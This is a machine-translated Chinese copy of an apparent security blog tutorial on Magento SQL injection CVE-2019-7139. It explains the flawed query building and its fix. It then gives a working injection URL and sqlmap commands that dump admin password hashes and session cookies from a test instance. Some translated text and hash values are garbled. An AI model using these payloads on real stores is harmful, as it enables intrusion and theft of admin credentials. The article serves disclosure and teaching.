<html>
<head>
<title>Exploiting SQL Injection in Magento Using Sqlmap | Pentest-Tools.com</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1>使用Sqlmap | Pentest-Tools.com在Magento中开发SQL注入</h1>
<blockquote>原文：<a href="https://pentest-tools.com/blog/exploiting-sql-injection-in-magento-with-sqlmap#2022-07-07T12:14:47.000Z">https://pentest-tools.com/blog/exploiting-sql-injection-in-magento-with-sqlmap#2022-07-07T12:14:47.000Z</a></blockquote><div><div class="prose prose-headings:break-words prose-img:rounded-md prose-img:ring-1 prose-img:ring-dark-blue-200 prose-img:ring-opacity-30 prose-code:break-words prose-headings:[scroll-margin-top:120px] xl:prose-lg xl:prose-headings:w-[628px] xl:prose-p:w-[628px]">
            
              
                
                  <p>在本文中，我们展示了一种利用Magento (CVE-2019-7139)中关键SQL注入漏洞的新方法，使用了众所周知的<a target="_blank" rel="external nofollow noopener noreferrer" href="http://sqlmap.org/"> SQLMap </a>工具。</p><p>在解释了漏洞细节之后，我们展示了如何使用SQLMap从数据库中提取任意信息，这是一种比最初的漏洞利用更强大的方法，它只能提取非常有限的信息。</p><h2 id="contents">内容</h2><ol start="1"><li><p><a href="#1-about-magento"> <strong>关于Magento </strong> </a></p></li><li><p><a href="#2-vulnerability-analysis"> <strong>漏洞分析</strong> </a></p></li><li><p><a href="#3-mitigation"> <strong>缓解</strong> </a></p></li><li><p><a href="#4-triggering-the-vulnerability"> <strong>触发漏洞</strong> </a></p></li><li><p><a href="#5-exploitation-with-sqlmap"> <strong>利用SQLMap </strong>开发T3】</a></p></li></ol><h2 id="1-about-magento">1.关于Magento</h2><p>Magento是一个流行的开源电子商务平台，目前有超过220，000家店铺活跃。这使得它成为黑客的一个有吸引力的目标。在过去的几年里，黑客利用多个漏洞入侵Magento网站，并植入恶意脚本，窃取结账页面上的支付数据。这种类型的攻击被称为web skimming，黑客用它来攻击成千上万的网站。</p><h2 id="2-vulnerability-analysis">2.弱点分析</h2><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-7139" rel="external nofollow noopener noreferrer"> CVE-2019-7139 </a>，又名<a href="https://magento.com/security/patches/magento-2.3.1-2.2.8-and-2.1.17-security-update" rel="external nofollow noopener noreferrer"> PRODSECBUG-2198 </a>，是一个未经认证的<a href="https://pentest-tools.com/website-vulnerability-scanning/sql-injection-scanner-online"> SQL注入漏洞</a>，影响Magento的部分版本。这个漏洞是由安全公司Ambionics的研究员Charles Fol发现的。</p><p>以下版本的Magento会受到此漏洞的影响:</p><div class="content-highlight"><pre class="code-block"><code>• Magento Open Source &lt;= 1.9.4.0	

• Magento Commerce &lt;= 1.14.4.0	

• Magento 2.1 &lt;= 2.1.16	

• Magento 2.2 &lt;= 2.2.7	

• Magento 2.3.0</code></pre></div><p>该漏洞存在于文件<code>lib\Magento\Framework\DB\Adapter\Pdo\Mysql.php</code>的方法<code>prepareSqlCondition</code>中，是由SQL查询构造方式的逻辑错误引起的。</p><p>为了更好地理解漏洞的根本原因，我们应该看看这个文件中Magento代码的一些片段。以下是漏洞的相关行:</p><div class="content-highlight"><pre class="code-block"><code>&lt;?php
/****
 ** Build SQL statement for condition
 **/
public function prepareSqlCondition($fieldName, $condition) {
    $conditionKeyMap = [
        'from'          =&gt; "{ {fieldName} } &gt;= ?",
        'to'            =&gt; "{ {fieldName} } &lt;= ?"
    ];
    $query = '';
    if (is_array($condition)) {
        if (isset($condition['from']) || isset($condition['to'])) {
            if (isset($condition['from'])) {
            [1] $from  = $this-&gt;_prepareSqlDateCondition($condition, 'from');
                $query = $this-&gt;_prepareQuotedSqlCondition($conditionKeyMap['from'], $from, $fieldName);
            }
            if (isset($condition['to'])) {
                $query .= empty($query) ? '' : ' AND ';
                $to     = $this-&gt;_prepareSqlDateCondition($condition, 'to');
                $query = $this-&gt;_prepareQuotedSqlCondition($query . $conditionKeyMap['to'], $to, $fieldName);
            }
        }
    }
    return $query;
}

protected function _prepareQuotedSqlCondition($text, $value, $fieldName) {
    $sql = $this-&gt;quoteInto($text, $value);
    $sql = str_replace('{ {fieldName} }', $fieldName, $sql);
    return $sql;
}
?&gt;</code></pre></div><p>使用关联数组<code>$condition</code>和变量<code>$fieldname</code>，方法<code>prepareSqlCondition</code>通过将给定的条件映射到<code>$conditionKeyMap</code>来构造SQL查询。当设置了字段$condition['from']和$condition['to']时，会触发此漏洞。下面的代码显示了bug是如何以及何时弹出的:</p><p>我们的分析从[1]开始:</p><p>1.首先，我们做作业<code>$from = $condition['from']</code>。然后我们调用<code>_prepareQuotedSqlCondition</code>，看起来像这样:</p><div class="content-highlight"><pre class="code-block"><code>$query = $this-&gt;_prepareQuotedSqlCondition("{ {fieldName} } &gt;= ?", $condition['from'], $fieldName)</code></pre></div><p>这个方法的作用是替换第一个“？”用变量<code>$condition['from']</code>和<code>{ {fieldName}</code>找到。在该调用结束时，查询变成:</p><div class="content-highlight"><pre class="code-block"><code>$query = "$fieldName &gt;= $condition['from']"</code></pre></div><p>2.现在，对于领域<code>$condition['to']</code>。我们的疑问首先转向:</p><div class="content-highlight"><pre class="code-block"><code>$query = "$fieldName &gt;= $condition['from'] AND "</code></pre></div><p>下一步是进行与之前<code>$to = $condition['to']</code>相同的分配。但是，一个问题出现了，因为下一个调用将是:</p><div class="content-highlight"><pre class="code-block"><code>$query = $this-&gt;_prepareQuotedSqlCondition("$fieldName &gt;= $condition['from'] AND { {fieldName} } &lt;= ?", $condition['to'], $fieldName)</code></pre></div><p>如前所述，这种方法取代了第一个“？”它用<code>$condition['to']</code>找到。如果我们加上“？”在<code>$condition['from']</code>中，我们可以用<code>$condition['to']</code>来代替。比如考虑<code>$condition['from'] = "?"</code>。上述调用后的结果查询变成:</p><div class="content-highlight"><pre class="code-block"><code>$query =  "$fieldName &gt;= $condition['to'] AND $fieldName  &lt;= ?"</code></pre></div><p>通过将<code>$condition ['to']</code>设置为适当的SQL代码，我们将成功地修改预期的查询。例如，如果是<code>$condition[‘to’] = "1 OR 1=1 -- "</code>，那么SQL查询就变成<code>$query = "$fieldName &gt;= 1 OR 1=1 -- AND $fieldName &lt;= ?"</code>。</p><h2 id="3-mitigation">3.减轻</h2><p>要解决这个问题，行</p><div class="content-highlight"><pre class="code-block"><code>$query = $this-&gt;_prepareQuotedSqlCondition($query . $conditionKeyMap['to'], $to, $fieldName);</code></pre></div><p>应该是:</p><div class="content-highlight"><pre class="code-block"><code>$query = $query . $this-&gt;_prepareQuotedSqlCondition($conditionKeyMap['to'], $to, $fieldName);</code></pre></div><p>Magento的最新版本已经修复了CVE-2019-7139漏洞。</p><h2 id="4-triggering-the-vulnerability">4.触发漏洞</h2><p>为了在测试环境中重现漏洞，我们在Docker中运行了Magento 2 . 2 . 6；图片可从<a target="_blank" rel="external nofollow noopener noreferrer" href="https://hub.docker.com/r/alexcheng/magento2/">这里</a>免费获取。</p><p>在最初的文章中，通过使用控制器<code>lib\Magento\Catalog\Controller\Product\Frontend\Action\Synchronize.php</code>来利用该漏洞。然而，<strong>这种剥削方式只在Magento &gt; = 2.2.0 </strong>中有效。</p><p>SQL注入的有效URL是:</p><div class="content-highlight"><pre class="code-block"><code>https://local.magento/catalog/product_frontend_action/synchronize?

type_id=recently_products&amp;

ids[0][added_at]=&amp;

ids[0][product_id][from]=?&amp;

ids[0][product_id][to]=))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=1) -- -</code></pre></div><p>由此开始，我们可以触发基于内容的<a target="_blank" rel="noopener noreferrer" href="https://pentest-tools.com/blog/sql-injection-attacks/#blind-sqli">盲SQLi </a>或基于时间的盲SQLi。下面是对数据库进行GET请求的两个示例:</p><h3 id="blind-sql-injection-content-based">–盲SQL注入–基于内容</h3><p>对于基于内容的盲SQL注入，下面的两个查询将当前用户的第一个字符与字符“A”进行比较。如果条件为真，服务器返回<strong> HTTP 400错误请求</strong>，因为我们试图将一个1列结果与一个2列结果连接起来。如果为假，我们得到<strong> HTTP 200 OK </strong>，因为联合后的选择被忽略。</p><p><img src="../Images/dbc41dd6ceb0c96251fc0950c8208085.png" alt="content-based blind SQL Injection query one" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZXhwbG9pdGluZy1zcWwtaW5qZWN0aW9uLWluLW1hZ2VudG8td2l0aC1zcWxtYXAvMS1ibGluZC1zcWwtaW5qZWN0aW9uLWNvbnRlbnQtYmFzZWQucG5n?s=dc33a890b612e25b08ad53da6614a84a"/> <img src="../Images/87433be2285b227631afafad58931d6e.png" alt="content-based blind SQL Injection query two" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZXhwbG9pdGluZy1zcWwtaW5qZWN0aW9uLWluLW1hZ2VudG8td2l0aC1zcWxtYXAvMi1ibGluZC1zcWwtaW5qZWN0aW9uLWNvbnRlbnQtYmFzZWQucG5n?s=e6a1018b8e93ab9c8c15b922c139e6f7"/></p><h3 id="blind-sql-injection-time-based">–盲SQL注入–基于时间</h3><p>对于基于时间的盲目SQL注入，我们看到了服务器响应时间的差异。如果条件评估为false，则调用SLEEP(5 ),服务器将在响应前休眠5秒钟。否则，我们会立即得到响应。</p><p><img src="../Images/b760d55e1115452b7551acdea0d09e0b.png" alt="time-based blind SQL Injection server's response 1" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZXhwbG9pdGluZy1zcWwtaW5qZWN0aW9uLWluLW1hZ2VudG8td2l0aC1zcWxtYXAvMy1ibGluZC1zcWwtaW5qZWN0aW9uLXRpbWUtYmFzZWQucG5n?s=3c31fe598cd3939dfcf5c60eeacd907f"/> <img src="../Images/ab42d09aeb80e541e26bb32790771db6.png" alt="time-based blind SQL Injection server's response 2" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZXhwbG9pdGluZy1zcWwtaW5qZWN0aW9uLWluLW1hZ2VudG8td2l0aC1zcWxtYXAvNC1ibGluZC1zcWwtaW5qZWN0aW9uLXRpbWUtYmFzZWQucG5n?s=93ca83e97996dbb5fc5b4cfe86c55d84"/></p><h2 id="5-exploitation-with-sqlmap">5.使用SQLMap开发</h2><p>原作者已经发布了针对该漏洞的<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/ambionics/magento-exploits/blob/master/magento-sqli.py">概念验证利用</a>；但是，它从数据库中提取的信息量非常有限。</p><p>通过使用<a href="https://pentest-tools.com/exploit-helpers/sqli-exploit-tool-sqlmap-online"> SQLMap </a>，一种更通用的利用方法是可能的。我们的目标是从数据库中提取任意信息，包括所有Magento admin用户的凭证。</p><p>SQLMap是利用数据库漏洞的事实上的工具，因为它在支持的参数方面具有多功能性——比如指定HTTP选项、SQLi技术、要提取的信息等等。既然我们知道漏洞是一个盲SQLi，那么相关的技术就是内容(<em>被SQLMap </em>称为布尔盲)和基于时间的SQL注入。更简单的方法是基于内容的攻击，这是我们要关注的。</p><p><strong>注意:</strong>要成功使用该方法，您必须使用参数<code>--ignore-code=400</code>或<code>--code=400</code>；否则，当SQLMap收到HTTP错误代码时，它会认为自己做错了什么。</p><h3 id="first-steps"><strong>第一步</strong></h3><p>在验证我们技术的有效性之前，这里列出了我们将在本节中使用的一些常用参数:</p><div class="content-highlight"><pre class="code-block"><code>-u          : the target url, with parameters included
--prefix    : prefix to add before the payload
--suffix    : suffix to add after the payload
-p          : parameter on which to inject the payload
--dbms      : database we assume to be running on target
--level     : range and number of payloads tried (1 to 5)
--risk      : risks of tests to perform (1 to 3)
--technique : technique to use; choose from one or more letters from "BEUSTQ"
--o         : some performance optimization</code></pre></div><p>首先，我们将使用以下命令提取当前数据库(参数<code>--current-db</code>):</p><div class="content-highlight"><pre class="code-block"><code>sqli@magento:~$ ./sqlmap.py -u 'http://local.magento/catalog/product_frontend_action/synchronize?type_id=recently_products&amp;ids[0][added_at]=&amp;ids[0][product_id][from]=?&amp;ids[0][product_id][to]=' -p "ids[0][product_id][to]" --prefix=")))" --suffix=" -- -" --dbms=mysql --technique=B --ignore-code=400 --level=5 --risk=3 -o --current-db</code></pre></div><p>成功利用SQLMap需要的特殊参数有:<code>--prefix</code>、<code>--suffix</code>和<code>ignore-code</code>。</p><p>结果:</p><h3 id="getting-more-sensitive-data"><img src="../Images/e51d7860d89f39efa4bde49b3b0fea86.png" alt="parameters required to successfully exploit with SQLMap" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZXhwbG9pdGluZy1zcWwtaW5qZWN0aW9uLWluLW1hZ2VudG8td2l0aC1zcWxtYXAvc3BlY2lhbC1jaGFyYWN0ZXJzLXRvLWV4cGxvaXQtd2l0aC1zcWxtYXAucG5n?s=c5107775200bb6cafa8c12ab7059008f"/>获取更敏感的数据</h3><p>现在我们想从数据库中提取更多有趣的东西，比如管理员凭证。以下是所需的步骤:</p><ol start="1"><li><p>查找名称中带有' admin '的表:我们可以使用SQLMap来搜索名称中带有某些字符串的表。当点击一个时，它浏览并打印相关结果。在我们的例子中，明显的表名是“admin ”,下面是SQLMap可以为我们找到的内容:</p></li></ol><div class="content-highlight"><pre class="code-block"><code>sqli@magento:~$ ./sqlmap.py -u 'http://local.magento/catalog/product_frontend_action/synchronize?type_id=recently_products&amp;ids[0][added_at]=&amp;ids[0][product_id][from]=?&amp;ids[0][product_id][to]=' -p "ids[0][product_id][to]" --prefix=")))" --suffix=" -- -" --dbms=mysql --technique=B --ignore-code=400 --level=5 --risk=3 -o --search -T admin</code></pre></div><p>结果:</p><p><img src="../Images/77374e09d0835f55145880108433f4de.png" alt="data extracted from database" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZXhwbG9pdGluZy1zcWwtaW5qZWN0aW9uLWluLW1hZ2VudG8td2l0aC1zcWxtYXAvZXh0cmFjdGluZy1zZW5zaXRpdmUtZGF0YS5wbmc=?s=d39a9d574216e4a43417d8e1fce295db"/>如果站点管理员仔细修改了默认表名，我们可以尝试不同的搜索字符串或使用–tables枚举数据库中的所有表名。</p><ol start="2"><li><p>现在，让我们转储<strong> admin_user </strong>表并查看其内部:</p></li></ol><div class="content-highlight"><pre class="code-block"><code>sqli@magento:~$ ./sqlmap.py -u 'http://local.magento/catalog/product_frontend_action/synchronize?type_id=recently_products&amp;ids[0][added_at]=&amp;ids[0][product_id][from]=?&amp;ids[0][product_id][to]=' -p "ids[0][product_id][to]" --prefix=")))" --suffix=" -- -" --dbms=mysql --technique=B  --ignore-code=400 --level=5 --risk=3 -o --dump -D magento -T admin_user</code></pre></div><p>新参数用于指定搜索区域:<code>-D</code>用于数据库，<code>-T</code>用于表。这里我们将只显示用户名和密码列，因为它们是我们感兴趣的:</p><div class="flex flex-col"><div class="-mx-4 -my-2 overflow-x-auto sm:-mx-6"><div class="inline-block min-w-full py-2 align-middle sm:px-6"><div class="border border-gray-200 bg-white overflow-hidden shadow sm:rounded-lg"><table class="min-w-full divide-y divide-gray-200"><thead><tr><td colspan="1" rowspan="1">用户</td><td colspan="1" rowspan="1">密码</td></tr></thead><tr><td colspan="1" rowspan="1">admin1</td><td colspan="1" rowspan="1">97999302 a 66 b 6 DCF 480 c 48681603509 ef 827d 71423307 f 3461857 BC 26 c 4362 c 8:<br/>rd 6 fn hdn 6 bqozfklzr 5 nt 9 KF BDS 1 gpgv:1</td></tr><tr><td colspan="1" rowspan="1">管理</td><td colspan="1" rowspan="1">815 ba FCA 0 bb 99 e 3709 f 6 FBE 5b 0d 941d 997 a5c 23d 3 f 7 a 4 e 0 BC C4 a9 b 77 b 8608 be 9:<br/>oid BCA 8 TP 41 bnlxwwlekgs 4 RM 5 lefjih:1</td></tr></table></div></div></div></div><p>请注意，密码以字符串形式存储在数据库中，由“:”分隔成三部分</p><div class="content-highlight"><pre class="code-block"><code>1) hash of salt and password
2) salt, by default of 32 bits length
3) version, where 1 is SHA256 and 0 is MD5</code></pre></div><p>有了这些信息，就可以用普通工具破解密码，如<a target="_blank" rel="external nofollow noopener noreferrer" href="https://hashcat.net/hashcat/">哈希卡特</a>或<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.openwall.com/john/">开膛手约翰</a>。</p><ol start="3"><li><p>一种更快的方法不是破解密码，而是从<strong>admin _ user<em>_</em>session</strong>表中提取会话cookies，如果有有效的话；这些都带有网站的管理员权限。默认情况下，会话cookie的有效期为15分钟，但该值是可定制的。和以前一样，我们必须转储表中的内容。为了说明SQLMap的另一个功能，这里我们将直接转储所需的列。</p></li></ol><div class="content-highlight"><pre class="code-block"><code>sqli@magento:~$ ./sqlmap.py -u 'http://local.magento/catalog/product_frontend_action/synchronize?type_id=recently_products&amp;ids[0][added_at]=&amp;ids[0][product_id][from]=?&amp;ids[0][product_id][to]=' -p "ids[0][product_id][to]" --prefix=")))" --suffix=" -- -" --dbms=mysql --technique=B --level=5 --risk=3 -o --dump -D magento -T admin_user_session -C session_id</code></pre></div><h3 id="learn-how-to-use-sqlmap-to-exploit-the-sql-injection-vulnerability-in-magento">了解如何使用SQLMap来利用Magento中的SQL注入漏洞</h3><p>在本文中，我们探索了Magento (CVE-2019-7139)中最近的一个SQL注入漏洞，了解了其根本原因，然后我们展示了一种更强大的利用方法，该方法使用SQLMap。您还可以了解当一个经过<a href="https://pentest-tools.com/blog/magento-authenticated-rce">认证的用户滥用Magento的协议指令</a>来实现基于PHAR文件反序列化方式的远程代码执行时会发生什么。</p><p><em>我们建议将Magento升级至最新版本，以缓解此漏洞，因为它相对容易被利用。</em></p>

                

                
              
            
          </div>
        </div>    
</body>
</html>